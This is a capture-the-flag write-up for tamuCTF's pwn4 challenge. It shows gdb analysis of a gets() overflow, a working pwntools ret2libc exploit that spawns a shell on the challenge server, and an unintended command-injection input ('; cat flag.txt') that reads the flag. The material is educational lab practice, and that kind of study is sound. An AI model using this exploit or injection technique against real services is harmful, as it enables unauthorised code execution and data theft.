## tamuCTF: pwn4
##### *tl;dr: ret2libc + unintended solution*
#### This challenge was a bit odd, not only because I was unfamiliar with the intended way of solving it but because of the unintended solution. Maybe the challenge creators have overlooked it? At this point, I'd want to explain the intended solution first to have a more in-depth discussion of what it is and how it is executed after which is just showing how to do the intended way. First things first, check for the security properties of the binary using *checksec*:
```
$ checksec pwn4
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
#### We can see that NX is enabled, this means that the stack has its non executable properties turned on, we can't execute code we put in the stack, thus we can't get a shell using shellcode. But before we jump to which exploit method to do, we have to play around with the binary.
```
$ ./pwn4
    ls as a service (laas)(Copyright pending)
    Enter the arguments you would like to pass to ls:
    aaaaaaaaaaaaaa
    Result of ls aaaaaaaaaaaaaa:
    ls: cannot access 'aaaaaaaaaaaaaa': No such file or directory
    ls as a service (laas)(Copyright pending)
    Enter the arguments you would like to pass to ls:
```
#### We see here that the binary just loops again and again, performing this process called ls as a service (laas). As the prompt says, we need to enter arguments for ls. Let's try putting in actual ls arguments:
```
$ ./pwn4
    ls as a service (laas)(Copyright pending)
    Enter the arguments you would like to pass to ls:
    -a
    Result of ls -a:
    .   exploit.py		   flag.txt	 peda-session-ls.txt	pwn4
    ..  exploit_unintended.py  .gdb_history  peda-session-pwn4.txt
    ls as a service (laas)(Copyright pending)
    Enter the arguments you would like to pass to ls:
    -l
    Result of ls -l:
    total 32
    -rw-r--r-- 1 venom venom  479 Mar  7 14:38 exploit.py
    -rw-r--r-- 1 venom venom  214 Mar  7 02:55 exploit_unintended.py
    -rw-r--r-- 1 venom venom   23 Feb 27 23:56 flag.txt
    -rw-r--r-- 1 venom venom    7 Mar  7 14:18 peda-session-ls.txt
    -rw-r--r-- 1 venom venom   12 Mar  7 14:34 peda-session-pwn4.txt
    -rwxr-xr-x 1 venom venom 7504 Feb 20 02:45 pwn4
```
#### Interesting. It actually runs the ls utility and performs it with the specified arguments, but if we input random gibberish we get nothing. We don't know our exploit method yet, but we do know that the binary runs the ls process in a loop. Let's fire up gdb to understand what's happening a little bit more:
```
$ gdb ./pwn4
    gdb-peda$ disas main
    Dump of assembler code for function main:
       [...]
       0x08048670 <+50>:	call   0x80485bb <laas>
       0x08048675 <+55>:	jmp    0x8048670 <main+50>
    End of assembler dump.
```
#### Proof that the binary just runs in a loop. Let's take a look at the laas function:
```
$ gdb ./pwn4
    gdb-peda$ disas laas
       [...]
       0x080485f4 <+57>:	lea    eax,[ebp-0x21]
       0x080485f7 <+60>:	push   eax
       0x080485f8 <+61>:	call   0x80483d0 <gets@plt>
       0x080485fd <+66>:	add    esp,0x10
       0x08048600 <+69>:	sub    esp,0x8
       0x08048603 <+72>:	push   0x2f
       0x08048605 <+74>:	lea    eax,[ebp-0x21]
       0x08048608 <+77>:	push   eax
       0x08048609 <+78>:	call   0x8048400 <strchr@plt>
       0x0804860e <+83>:	add    esp,0x10
       0x08048611 <+86>:	test   eax,eax
       0x08048613 <+88>:	jne    0x8048626 <laas+107>
       0x08048615 <+90>:	sub    esp,0xc
       0x08048618 <+93>:	lea    eax,[ebp-0x21]
       0x0804861b <+96>:	push   eax
       0x0804861c <+97>:	call   0x8048566 <run_cmd>
       [...]
```
#### We see a gets() call, which we know by now to be vulnerable to buffer overflow attacks, and as seen on the results of checksec, there is no stack canary for the binary which means we can be able to perform the attack. One last thing to look at is the run_cmd function:
```
$ gdb ./pwn4
    gdb-peda$ disas run_cmd
       [...]
       0x080485a9 <+67>:	lea    eax,[ebp-0x26]
       0x080485ac <+70>:	push   eax
       0x080485ad <+71>:	call   0x80483f0 <system@plt>
       0x080485b2 <+76>:	add    esp,0x10
```
#### The function calls ```<system@plt>``` which is used to issue a command to be executed, in the binary's case, it executes the ls command which prints out the contents of the directory and other options based on what argument is given. What makes this interesting is that system function is stored in the ```C Library```, specifically in stdlib.h.This is where we are introduced to the concept of ```ret2libc``` (return to libc) which is a means to defeat a non-executable stack by using the functions stored in the C Library. Piecing together what we know so far, our exploid method will be a buffer overflow into ret2libc. For this, we'll need the offset to overflow the buffer (which we already know from the disassembly of the laas function, the buffer has a size of 33 (0x21) and we'll need 4 bytes more - total of 37 bytes to smash the stack), the address of the system function and /bin/sh which we would pass to system in order for us to get a shell. We can do this with gdb:
```
$ gdb ./pwn4
    gdb-peda$ x/ system
        0x80483f0 <system@plt>:	0xa01825ff
```
#### We now know where system is stored at, which is at address 0x80483f0. Next we'll need to locate the /bin/sh string (why string? because system requires a string argument, which will be the function it'll execute), we can do this with the ```find``` functionality of gdb:
```
$ gdb ./pwn4
    gdb-peda$ find /bin/sh
        Searching for '/bin/sh' in: None ranges
        Found 1 results, display max 1 items:
        pwn4 : 0x804a034 ("/bin/sh")
```
#### Now we have all the ingredients we need for our exploit code. But before we head onto that, we need to take in mind the order for our exploit which is ```offset + system_address + four_dummy_bytes + bin_sh```, the reason for this is because it has something to do with the function prologue of the system function. Essentially, this is the part of the function that sets up the stack frame the function will use. This includes making sure that arguments are passed to the function correctly. Now our exploit:
##### exploit.py
```python
from pwn import *

#: Connect to challenge server
HOST = 'pwn.tamuctf.com'
PORT = 4324
p = remote(HOST,PORT)
# p = process('./pwn4')
print(p.recv())

#: Exploit code
offset = 'A' * 37
system = p32(0x080483f0)
junk = p32(0xdeadbeef)
bin_sh = p32(0x0804a034) 
exploit = offset + system + junk + bin_sh

#: Send data
p.sendline(exploit)
print(p.recv())
p.sendline('cat flag.txt')
print(p.recv())
```
#### Now we run our exploit and get the flag!:
```
$ python exploit.py
ls as a service (laas)(Copyright pending)
Enter the arguments you would like to pass to ls:

Result of ls AAAAAAAAAAAAAAAAAAAAAAA:

gigem{5y573m_0v3rfl0w}
```
#### The unintended solution
#### We can just seperate which commands to execute in the terminal using a semicolon ```(;)```. We can simply connect to the server and input ```; cat flag.txt``` which will output the flag for us.
